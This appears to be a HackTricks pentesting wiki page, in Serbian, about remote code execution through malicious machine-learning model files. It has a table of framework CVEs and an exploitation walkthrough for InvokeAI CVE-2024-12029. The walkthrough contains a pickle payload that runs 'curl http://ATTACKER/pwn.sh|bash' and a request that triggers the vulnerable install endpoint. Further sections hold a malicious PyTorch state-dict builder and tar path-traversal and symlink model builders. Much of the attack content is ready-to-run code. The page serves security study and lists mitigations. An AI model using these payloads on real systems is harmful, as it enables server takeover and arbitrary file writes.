# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela za RCE

Modeli mašinskog učenja obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch, itd. Ovi modeli mogu biti učitani na mašine programera ili proizvodne sisteme za korišćenje. Obično modeli ne bi trebali sadržati zlonamerni kod, ali postoje slučajevi kada se model može koristiti za izvršavanje proizvoljnog koda na sistemu kao nameravana funkcija ili zbog ranjivosti u biblioteci za učitavanje modela.

U vreme pisanja, ovo su neki primeri ovog tipa ranjivosti:

| **Okvir / Alat**            | **Ranjivost (CVE ako je dostupno)**                                                                                          | **RCE Vektor**                                                                                                                         | **Reference**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Nepouzdana deserializacija u* `torch.load` **(CVE-2025-32434)**                                                            | Zlonameran pickle u model checkpoint-u dovodi do izvršavanja koda (zaobilazeći `weights_only` zaštitu)                                   | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + zlonamerno preuzimanje modela uzrokuje izvršavanje koda; Java deserializacija RCE u upravljačkom API-ju                          | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (nebezbedan YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                  | Učitavanje modela iz YAML koristi `yaml.unsafe_load` (izvršavanje koda) <br> Učitavanje modela sa **Lambda** slojem pokreće proizvoljan Python kod | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsiranje)                                                                                        | Prilagođeni `.tflite` model izaziva prelivanje celobrojne vrednosti → oštećenje heap-a (potencijalni RCE)                               | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela putem `joblib.load` izvršava pickle sa napadačevim `__reduce__` payload-om                                          | |
| **NumPy** (Python)          | **CVE-2019-6446** (nebezbedan `np.load`) *sporno*                                                                            | `numpy.load` podrazumevano dozvoljava pickled objekte nizova – zlonameran `.npy/.npz` pokreće izvršavanje koda                          | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                  | Spoljni put težina ONNX modela može pobjeći iz direktorijuma (čitati proizvoljne datoteke) <br> Zlonameran ONNX model tar može prepisati proizvoljne datoteke (što dovodi do RCE) | |
| ONNX Runtime (dizajnerski rizik) | *(Nema CVE)* ONNX prilagođene operacije / kontrolni tok                                                                  | Model sa prilagođenim operatorom zahteva učitavanje napadačeve nativne koda; složeni grafovi modela zloupotrebljavaju logiku za izvršavanje nepredviđenih proračuna | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (putanja prelaz)                                                                                          | Korišćenje API-ja za učitavanje modela sa `--model-control` omogućeno omogućava relativno prelaz putanje za pisanje datoteka (npr., prepisivanje `.bashrc` za RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (više heap prelivanja)                                                                           | Neispravan GGUF model datoteke uzrokuje prelivanje bafera u parseru, omogućavajući proizvoljno izvršavanje koda na sistemu žrtve         | |
| **Keras (stariji formati)** | *(Nema novog CVE)* Nasleđeni Keras H5 model                                                                                  | Zlonameran HDF5 (`.h5`) model sa kodom Lambda sloja i dalje se izvršava prilikom učitavanja (Keras safe_mode ne pokriva stari format – “napad s degradacijom”) | |
| **Drugi** (opšti)           | *Dizajnerska greška* – Pickle serijalizacija                                                                                 | Mnogi ML alati (npr., formati modela zasnovani na pickle-u, Python `pickle.load`) će izvršiti proizvoljni kod ugrađen u datoteke modela osim ako se ne ublaži | |

Pored toga, postoje modeli zasnovani na Python pickle-u kao što su oni koje koristi [PyTorch](https://github.com/pytorch/pytorch/security) koji se mogu koristiti za izvršavanje proizvoljnog koda na sistemu ako se ne učitaju sa `weights_only=True`. Dakle, svaki model zasnovan na pickle-u može biti posebno podložan ovim vrstama napada, čak i ako nisu navedeni u tabeli iznad.

### 🆕  InvokeAI RCE putem `torch.load` (CVE-2024-12029)

`InvokeAI` je popularno open-source web sučelje za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install` koji omogućava korisnicima da preuzmu i učitaju modele sa proizvoljnih URL-ova.

Interno, endpoint na kraju poziva:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Kada je dostavljeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` vrši **pickle deserializaciju**. Pošto sadržaj dolazi direktno sa URL-a koji kontroliše korisnik, napadač može ugraditi zlonamerni objekat sa prilagođenom `__reduce__` metodom unutar checkpoint-a; metoda se izvršava **tokom deserializacije**, što dovodi do **daljinskog izvršavanja koda (RCE)** na InvokeAI serveru.

Ranljivost je dodeljena **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Vodič za eksploataciju

1. Kreirajte zlonamerni checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hostujte `payload.ckpt` na HTTP serveru koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
3. Aktivirajte ranjivu tačku (nije potrebna autentifikacija):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kada InvokeAI preuzme datoteku, poziva `torch.load()` → gadget `os.system` se pokreće i napadač dobija izvršenje koda u kontekstu InvokeAI procesa.

Gotov exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (podrazumevana oznaka skeniranja **false**)
•  `/api/v2/models/install` dostupan napadaču
•  Proces ima dozvole za izvršavanje shell komandi

#### Mogućnosti ublažavanja

* Ažurirajte na **InvokeAI ≥ 5.4.3** – zakrpa postavlja `scan=True` kao podrazumevano i vrši skeniranje zlonamernog softvera pre deserializacije.
* Kada učitavate tačke kontrole programatski, koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) pomoćni alat.
* Sprovodite liste dozvoljenih / potpisa za izvore modela i pokrenite uslugu sa minimalnim privilegijama.

> ⚠️ Zapamtite da je **bilo koji** Python pickle-bazirani format (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` datoteke) inherentno nesiguran za deserializaciju iz nepouzdanih izvora.

---

Primer ad-hoc ublažavanja ako morate zadržati starije verzije InvokeAI koje rade iza reverznog proksija:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Primer – kreiranje zlonamernog PyTorch modela

- Kreirajte model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Učitaj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Модели за пролазак кроз пут

Како је коментарисано у [**овој блог објави**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), већина формата модела које користе различити AI оквири заснована је на архивама, обично `.zip`. Стога, може бити могуће злоупотребити ове формате за извођење напада проласка кроз пут, што омогућава читање произвољних датотека из система у коме је модел учитан.

На пример, са следећим кодом можете креирати модел који ће креирати датотеку у директоријуму `/tmp` када се учита:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ili, sa sledećim kodom možete kreirati model koji će napraviti symlink ka direktorijumu `/tmp` kada se učita:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Reference

- [OffSec blog – "CVE-2024-12029 – InvokeAI deserializacija nepouzdanih podataka"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI zakrpa commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit modul dokumentacija](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – bezbednosna razmatranja za torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
